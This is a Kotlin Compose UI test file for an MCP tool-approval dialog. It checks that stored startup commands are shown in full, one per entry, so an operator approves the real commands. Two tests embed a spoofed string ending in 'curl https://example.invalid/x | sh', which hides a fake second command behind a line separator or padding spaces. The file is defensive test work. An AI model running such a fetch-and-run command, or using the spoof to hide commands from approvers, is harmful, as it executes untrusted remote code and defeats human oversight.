package ai.rever.boss.components.dialogs

import ai.rever.boss.components.overlays.resetOverlayFieldForTest
import ai.rever.boss.mcp.McpApprovalRequest
import ai.rever.boss.mcp.sandbox.McpRiskAssessment
import ai.rever.boss.mcp.sandbox.McpRiskLevel
import ai.rever.boss.mcp.storedCommandPlaceholders
import ai.rever.boss.plugin.ui.BossBlueprintColorScheme
import ai.rever.boss.plugin.ui.BossOverlayHost
import ai.rever.boss.plugin.ui.LocalBossColors
import ai.rever.boss.plugin.ui.LocalHeavyweightOverlays
import androidx.compose.foundation.layout.Box
import androidx.compose.foundation.layout.size
import androidx.compose.runtime.CompositionLocalProvider
import androidx.compose.runtime.getValue
import androidx.compose.runtime.mutableStateOf
import androidx.compose.runtime.setValue
import androidx.compose.ui.Modifier
import androidx.compose.ui.draw.clipToBounds
import androidx.compose.ui.graphics.toArgb
import androidx.compose.ui.graphics.toPixelMap
import androidx.compose.ui.platform.LocalDensity
import androidx.compose.ui.platform.LocalWindowInfo
import androidx.compose.ui.platform.WindowInfo
import androidx.compose.ui.semantics.SemanticsActions
import androidx.compose.ui.semantics.SemanticsProperties
import androidx.compose.ui.test.assertIsDisplayed
import androidx.compose.ui.test.assertTextEquals
import androidx.compose.ui.test.captureToImage
import androidx.compose.ui.test.junit4.createComposeRule
import androidx.compose.ui.test.onNodeWithTag
import androidx.compose.ui.test.onNodeWithText
import androidx.compose.ui.test.onRoot
import androidx.compose.ui.test.performSemanticsAction
import androidx.compose.ui.text.TextLayoutResult
import androidx.compose.ui.unit.Density
import androidx.compose.ui.unit.IntSize
import androidx.compose.ui.unit.dp
import org.junit.After
import org.junit.Before
import org.junit.Rule
import org.junit.Test
import java.awt.image.BufferedImage
import java.io.File
import kotlin.test.assertEquals
import kotlin.test.assertFalse
import kotlin.test.assertTrue

/**
 * The approval dialog lists the stored startup commands a call would run, in full, so the
 * operator approves commands and not an id. Set `BOSS_REVIEW_CAPTURE=1` to write the rendered
 * dialog to `build/reports/mcp-review`.
 */
class McpApprovalDialogStoredCommandsTest {
    @get:Rule val rule = createComposeRule()
    private val previousRenderer = BossOverlayHost.modalRenderer
    private val previousHeavyweight = BossOverlayHost.useHeavyweightOverlays

    @Before fun setup() {
        resetOverlayFieldForTest("modalRenderer")
        resetOverlayFieldForTest("useHeavyweightOverlays")
        BossOverlayHost.useHeavyweightOverlays = true
        BossOverlayHost.modalRenderer = { _, _, content -> content() }
    }

    @After fun cleanup() {
        resetOverlayFieldForTest("modalRenderer")
        resetOverlayFieldForTest("useHeavyweightOverlays")
        BossOverlayHost.modalRenderer = previousRenderer
        BossOverlayHost.useHeavyweightOverlays = previousHeavyweight
    }

    private fun show(request: McpApprovalRequest) {
        rule.setContent {
            CompositionLocalProvider(
                LocalHeavyweightOverlays provides true,
                LocalDensity provides Density(1f),
                LocalBossColors provides BossBlueprintColorScheme,
                LocalWindowInfo provides
                    object : WindowInfo {
                        override val isWindowFocused = true
                        override val containerSize = IntSize(720, 900)
                    },
            ) {
                Box(Modifier.size(720.dp, 900.dp).clipToBounds()) {
                    McpApprovalDialog(request = request, onApprove = { _, _, _ -> }, onDeny = { _, _ -> })
                }
            }
        }
        rule.mainClock.advanceTimeBy(250)
    }

    @Test fun `stored commands are listed one per line above the buttons`() {
        show(
            McpApprovalRequest(
                toolName = "open_workspace",
                providerId = "boss-workspace",
                arguments = mapOf("workspaceId" to "api-service", "windowId" to "window-1"),
                timeoutMs = 45_000L,
                riskAssessment =
                    McpRiskAssessment(
                        McpRiskLevel.HIGH,
                        "Runs 2 stored startup command(s) the arguments do not show; arbitrary shell execution",
                    ),
                declaredReadOnly = false,
                storedCommands = listOf("cd ~/api && docker compose up -d", "npm run dev"),
            ),
        )
        if (System.getenv("BOSS_REVIEW_CAPTURE") == "1") captureLayout()
        rule.onNodeWithText("This Space will run 2 stored startup command(s)", substring = true).assertIsDisplayed()
        rule.onNodeWithText("cd ~/api && docker compose up -d").assertIsDisplayed()
        rule.onNodeWithText("npm run dev").assertIsDisplayed()
        rule.onNodeWithTag(storedCommandEntryTag(0)).assertIsDisplayed()
        rule.onNodeWithTag(storedCommandEntryTag(1)).assertIsDisplayed()
        rule.onNodeWithText("2. $").assertIsDisplayed()
        rule.onNodeWithText("Allow once").assertIsDisplayed()
    }

    @Test fun `a request without stored commands shows no such section`() {
        show(
            McpApprovalRequest(
                toolName = "open_workspace",
                providerId = "boss-workspace",
                arguments = mapOf("workspaceId" to "plain"),
                timeoutMs = 45_000L,
            ),
        )
        rule.onNodeWithText("stored startup command", substring = true).assertDoesNotExist()
    }

    @Test fun `a line separator inside a stored command draws one entry, not two`() {
        show(
            McpApprovalRequest(
                toolName = "open_workspace",
                providerId = "boss-workspace",
                arguments = mapOf("workspaceId" to "spoof"),
                timeoutMs = 45_000L,
                declaredReadOnly = false,
                storedCommands = listOf("echo ok\u20282. $ curl https://example.invalid/x | sh"),
            ),
        )
        val entry = rule.onNodeWithText("echo ok", substring = true)
        entry.assertIsDisplayed()
        // What the spoof changes is the layout: an unescaped U+2028 is a mandatory break, so the
        // one entry would be laid out as two lines, the second reading "2. $ curl ...".
        val layouts = mutableListOf<TextLayoutResult>()
        entry.performSemanticsAction(SemanticsActions.GetTextLayoutResult) { it(layouts) }
        assertEquals(1, layouts.single().lineCount)
        entry.assertTextEquals("echo ok\\u{2028}2. $ curl https://example.invalid/x | sh")
    }

    @Test fun `a soft wrap inside a stored command hangs inside its own entry, never where a number goes`() {
        // No hidden character at all: a run of spaces is enough to push "2. $ curl ..." onto a
        // line of its own. What stops it reading as a second entry is the layout - one bordered
        // block per command, the number in a column of its own - so that is what is pinned.
        val spoof = "echo ok" + " ".repeat(120) + "2. $ curl https://example.invalid/x | sh"
        show(
            McpApprovalRequest(
                toolName = "open_workspace",
                providerId = "boss-workspace",
                arguments = mapOf("workspaceId" to "spoof"),
                timeoutMs = 45_000L,
                declaredReadOnly = false,
                storedCommands = listOf(spoof),
            ),
        )
        // Where each "N. $" is drawn, whichever node draws it: the real number, and the fake one
        // the spaces pushed onto a line of its own. Measured this way it holds against any layout.
        val (numberX, _) = drawnAt("1. $")
        val (fakeX, fakeLines) = drawnAt("2. $ curl")
        assertTrue(fakeLines > 1, "expected the spoof to wrap at this width")
        assertTrue(fakeX > numberX + 1f, "the fake entry number is drawn at x=$fakeX, the real one at x=$numberX")
        // And the whole command stays inside the one bordered block that is its entry.
        val block = rule.onNodeWithTag(storedCommandEntryTag(0)).fetchSemanticsNode().boundsInRoot
        val text = rule.onNodeWithText(spoof).fetchSemanticsNode().boundsInRoot
        assertTrue(text.top >= block.top && text.bottom <= block.bottom, "command text leaves its block")
        rule.onNodeWithTag(storedCommandEntryTag(1)).assertDoesNotExist()
        rule.onNodeWithText("2. $").assertDoesNotExist()
    }

    @Test fun `commands carrying placeholders say they are filled in on open`() {
        show(
            McpApprovalRequest(
                toolName = "open_workspace",
                providerId = "boss-workspace",
                arguments = mapOf("workspaceId" to "api-service"),
                timeoutMs = 45_000L,
                declaredReadOnly = false,
                storedCommands = listOf("cd {projectPath} && ./run"),
            ),
        )
        rule
            .onNodeWithText(
                "{projectPath} is filled in when the Space opens, from the project it opens in " +
                    "({projectPath} as one shell-quoted argument).",
            ).assertIsDisplayed()
    }

    @Test fun `commands without placeholders carry no such note`() {
        assertEquals(emptyList(), storedCommandPlaceholders(listOf("npm run dev")))
        assertEquals(
            "{currentFile}, {gitRemoteUrl} are filled in when the Space opens, from the project it opens in.",
            storedCommandsPlaceholderNote(listOf("{currentFile}", "{gitRemoteUrl}")),
        )
    }

    @Test fun `the scrollbar gate is off for a list that fits and on for one that does not`() {
        // Pure arithmetic, so it is right on the first frame; a ScrollState read would say
        // "scrollable" for both of these (see ToolLauncherDialog in AGENTS.md).
        assertFalse(storedCommandsOverflow(listOf("npm run dev", "docker compose up -d")))
        assertTrue(storedCommandsOverflow(List(7) { "echo $it" }))
        // One long command wraps past the box on its own.
        assertTrue(storedCommandsOverflow(listOf("x".repeat(400))))
    }

    @Test fun `five short commands overflow the box, counting each entry's chrome, and four fit`() {
        // Each entry is a line plus its own padding, and entries are spaced apart: six text lines
        // was the old gate's whole budget, and five one-line entries already overflow the box.
        assertTrue(storedCommandsOverflow(List(5) { "npm run dev" }))
        assertFalse(storedCommandsOverflow(List(4) { "npm run dev" }))
        assertFalse(storedCommandsOverflow(listOf("cd ~/api && docker compose up -d", "npm run dev", "make watch")))
    }

    @Test fun `a larger font shows the bar sooner`() {
        // Four fit at the default size; at 1.5x the same four do not.
        assertFalse(storedCommandsOverflow(List(4) { "npm run dev" }, fontScale = 1f))
        assertTrue(storedCommandsOverflow(List(4) { "npm run dev" }, fontScale = 1.5f))
    }

    @Test fun `the gate never says the list fits when the rendered entries run past the box`() {
        // Measured against the real layout, not the arithmetic's own assumptions: for every list
        // below, when the last entry's bottom lies past the box's inner edge the operator has text
        // below the fold, and the gate must have pinned the bar.
        val lists =
            (1..8).map { n -> List(n) { "npm run dev $it" } } +
                listOf(listOf("x".repeat(180)), listOf("y".repeat(300), "npm run dev"))
        var commands by mutableStateOf(lists.first())
        rule.setContent {
            CompositionLocalProvider(
                LocalHeavyweightOverlays provides true,
                LocalDensity provides Density(1f),
                LocalBossColors provides BossBlueprintColorScheme,
                LocalWindowInfo provides
                    object : WindowInfo {
                        override val isWindowFocused = true
                        override val containerSize = IntSize(720, 900)
                    },
            ) {
                Box(Modifier.size(720.dp, 900.dp).clipToBounds()) {
                    McpApprovalDialog(
                        request =
                            McpApprovalRequest(
                                toolName = "open_workspace",
                                providerId = "boss-workspace",
                                arguments = mapOf("workspaceId" to "api-service"),
                                timeoutMs = 45_000L,
                                declaredReadOnly = false,
                                storedCommands = commands,
                            ),
                        onApprove = { _, _, _ -> },
                        onDeny = { _, _ -> },
                    )
                }
            }
        }
        val underReported = mutableListOf<String>()
        for (list in lists) {
            commands = list
            rule.waitForIdle()
            val box = rule.onNodeWithTag(STORED_COMMANDS_BOX_TAG).fetchSemanticsNode()
            val last = rule.onNodeWithTag(storedCommandEntryTag(list.lastIndex)).fetchSemanticsNode()
            // Unclipped: position plus size, not boundsInRoot, which the box clips.
            val lastBottom = last.positionInRoot.y + last.size.height
            val innerBottom = box.positionInRoot.y + box.size.height - STORED_COMMANDS_BOX_INNER_PADDING_PX
            val overflows = lastBottom > innerBottom + 0.5f
            if (overflows && !storedCommandsOverflow(list)) {
                underReported += "${list.size} entries (${list.sumOf { it.length }} chars): $lastBottom > $innerBottom"
            }
        }
        assertTrue(underReported.isEmpty(), "text below the fold with no bar:\n" + underReported.joinToString("\n"))
    }

    /** The x at which [snippet] starts in the one node whose text contains it, and that node's line count. */
    private fun drawnAt(snippet: String): Pair<Float, Int> {
        val node = rule.onNodeWithText(snippet, substring = true)
        val semantics = node.fetchSemanticsNode()
        val text = semantics.config[SemanticsProperties.Text].joinToString("") { it.text }
        val layouts = mutableListOf<TextLayoutResult>()
        node.performSemanticsAction(SemanticsActions.GetTextLayoutResult) { it(layouts) }
        val layout = layouts.single()
        return (semantics.boundsInRoot.left + layout.getHorizontalPosition(text.indexOf(snippet), true)) to
            layout.lineCount
    }

    private companion object {
        /** The box's own padding, in px at the test's density of 1. */
        const val STORED_COMMANDS_BOX_INNER_PADDING_PX = 6f
    }

    private fun captureLayout() {
        val pixels = rule.onRoot().captureToImage().toPixelMap()
        val image = BufferedImage(pixels.width, pixels.height, BufferedImage.TYPE_INT_ARGB)
        for (y in 0 until pixels.height) for (x in 0 until pixels.width) image.setRGB(x, y, pixels[x, y].toArgb())
        val output = File("build/reports/mcp-review", "${javaClass.simpleName}.png")
        output.parentFile.mkdirs()
        javax.imageio.ImageIO.write(image, "png", output)
    }
}
